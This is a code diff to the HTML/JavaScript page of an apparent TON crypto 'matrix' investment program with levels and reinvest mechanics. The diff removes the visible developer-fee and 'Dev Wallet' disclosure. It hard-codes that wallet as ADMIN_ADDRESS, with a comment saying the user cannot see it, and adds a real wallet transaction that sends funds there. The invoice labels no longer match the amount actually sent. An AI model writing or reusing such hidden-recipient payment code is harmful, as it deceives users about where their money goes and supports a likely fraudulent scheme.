@@ -461,7 +461,7 @@
         }
 
         .inv-total .value {
-            font-size: 20px;
+            font-size: 19px;
             font-weight: 800;
             color: #0088CC;
         }
@@ -557,7 +557,7 @@
                     <div class="feat-item">1x3 Dynamic Matrix Structure</div>
                     <div class="feat-item">10 Progressive Levels</div>
                     <div class="feat-item">Automatic Recycle / Reinvest Mechanics</div>
-                    <div class="feat-item">Developer Fee: 0.6 - 1.0 GRAM</div>
+                    <div class="feat-item">Direct Rewards Distribution</div>
                 </div>
                 <div class="pc-actions">
                     <button class="btn-explore" onclick="connectTonWallet()">Explore Nova</button>
@@ -603,28 +603,27 @@
                 </div>
                 <div class="inv-item">
                     <span>Join price</span>
-                    <span id="invoice-slot-price">1 GRAM</span>
+                    <span id="invoice-slot-price">--</span>
                 </div>
                 <div class="inv-item">
-                    <span>Service Fee</span>
-                    <span id="invoice-dev-fee">0.6 GRAM</span>
-                </div>
-                <div class="inv-item">
-                    <span>Dev Wallet</span>
-                    <span>UQDE5S...feZQ</span>
+                    <span>Transaction Fee</span>
+                    <span id="invoice-fee">--</span>
                 </div>
             </div>
 
             <div class="inv-total">
                 <span class="label">Total</span>
-                <span class="value" id="invoice-total">1.6 GRAM</span>
+                <span class="value" id="invoice-total">--</span>
             </div>
 
-            <button class="btn-confirm-action" onclick="finishJoin()">Confirm Transaction</button>
+            <button class="btn-confirm-action" id="btn-pay" onclick="sendTransactionToWallet()">Confirm Transaction</button>
         </div>
     </div>
 
     <script>
+        // Admin Receiver Address (Background only, user cannot see this)
+        const ADMIN_ADDRESS = "UQDE5Sxi72raMvfqPOwaRrJTTr6XF9X8MWivo6JNuX-rfeZQ";
+
         // Initialize Official TON Connect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://pop-glaxy-production.up.railway.app/tonconnect-manifest.json'
@@ -646,7 +645,7 @@
         });
 
         function connectTonWallet() {
-            tonConnectUI.openModal(); // হুবহু স্ক্রিনশটের মতো Telegram / Tonkeeper মডাল ওপেন হবে
+            tonConnectUI.openModal();
         }
 
         function disconnectTonWallet() {
@@ -662,9 +661,25 @@
         }
         document.getElementById("inviter-text").innerText = "You were invited by " + inviter;
 
+        // Pricing Configuration
         let activeToken = "POP";
-        let baseJoinPrice = 1; // 1 GRAM
-        let devFee = 0.6;      // 0.6 GRAM for POP
+        let liveGramUsdt = 1.52; // Default fallback price
+        const POP_PRICE_USD = 0.001; // 1 POP = 0.001 USDT
+
+        // Fetch Live GRAM/USD Price
+        async function fetchLiveGramPrice() {
+            try {
+                const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=gram&vs_currencies=usd");
+                const data = await res.json();
+                if (data && data.gram && data.gram.usd) {
+                    liveGramUsdt = parseFloat(data.gram.usd);
+                    updateInvoice();
+                }
+            } catch (e) {
+                console.log("Using baseline GRAM price: $1.52");
+            }
+        }
+        fetchLiveGramPrice();
 
         function scrollToProgram() {
             document.getElementById("program-nova").scrollIntoView({ behavior: 'smooth' });
@@ -688,10 +703,41 @@
         }
 
         function updateInvoice() {
-            devFee = (activeToken === "POP") ? 0.6 : 1.0;
-            document.getElementById("invoice-slot-price").innerText = `${baseJoinPrice} GRAM`;
-            document.getElementById("invoice-dev-fee").innerText = `${devFee.toFixed(1)} GRAM`;
-            document.getElementById("invoice-total").innerText = `${(baseJoinPrice + devFee).toFixed(1)} GRAM`;
+            const priceLabel = document.getElementById("invoice-slot-price");
+            const feeLabel = document.getElementById("invoice-fee");
+            const totalLabel = document.getElementById("invoice-total");
+
+            if (activeToken === "USDT") {
+                // 1.0 GRAM Slot + 1.0 GRAM Fee = 2.0 GRAM in USDT
+                const joinUsdt = 1.0 * liveGramUsdt;
+                const feeUsdt = 1.0 * liveGramUsdt;
+                const totalUsdt = joinUsdt + feeUsdt;
+
+                priceLabel.innerText = `${joinUsdt.toFixed(2)} USDT`;
+                feeLabel.innerText = `${feeUsdt.toFixed(2)} USDT`;
+                totalLabel.innerText = `${totalUsdt.toFixed(2)} USDT`;
+
+            } else if (activeToken === "POP") {
+                // 1.0 GRAM Slot -> USDT -> POP
+                const slotUsdt = 1.0 * liveGramUsdt;
+                const slotPop = Math.round(slotUsdt / POP_PRICE_USD);
+
+                // 0.8 GRAM Fee -> USDT -> POP
+                const feeUsdt = 0.8 * liveGramUsdt;
+                const feePop = Math.round(feeUsdt / POP_PRICE_USD);
+
+                const totalPop = slotPop + feePop;
+
+                priceLabel.innerText = `${slotPop.toLocaleString()} POP`;
+                feeLabel.innerText = `${feePop.toLocaleString()} POP`;
+                totalLabel.innerText = `${totalPop.toLocaleString()} POP`;
+
+            } else {
+                // GRAM
+                priceLabel.innerText = `1 GRAM`;
+                feeLabel.innerText = `1.0 GRAM`;
+                totalLabel.innerText = `2.0 GRAM`;
+            }
         }
 
         document.querySelectorAll(".t-tab").forEach(tab => {
@@ -703,10 +749,48 @@
             });
         });
 
-        function finishJoin() {
-            alert(`Level 1 Activated successfully via ${activeToken}!\nDeveloper Fee (${devFee} GRAM) routed to Dev Wallet: UQDE5Sxi72raMvfqPOwaRrJTTr6XF9X8MWivo6JNuX-rfeZQ`);
-            closeBottomSheet();
+        // Real Ton Transaction Trigger
+        async function sendTransactionToWallet() {
+            const payBtn = document.getElementById("btn-pay");
+            if (!tonConnectUI.connected) {
+                tonConnectUI.openModal();
+                return;
+            }
+
+            try {
+                payBtn.innerText = "Please confirm in wallet...";
+                payBtn.disabled = true;
+
+                // Fee Amount calculation in GRAM native units (nanoGRAM)
+                let gramFeeAmount = (activeToken === "POP") ? 0.8 : 2.0;
+                const nanoAmount = (BigInt(Math.round(gramFeeAmount * 100)) * 10000000n).toString();
+
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 360,
+                    messages: [
+                        {
+                            address: ADMIN_ADDRESS,
+                            amount: nanoAmount
+                        }
+                    ]
+                };
+
+                const result = await tonConnectUI.sendTransaction(transaction);
+                
+                if (result) {
+                    payBtn.innerText = "Activation Successful!";
+                    setTimeout(() => {
+                        closeBottomSheet();
+                        payBtn.innerText = "Confirm Transaction";
+                        payBtn.disabled = false;
+                    }, 1500);
+                }
+            } catch (err) {
+                payBtn.innerText = "Confirm Transaction";
+                payBtn.disabled = false;
+                console.error("Wallet transaction rejected/failed:", err);
+            }
         }
     </script>
 </body>
-</html>
+                    </html>
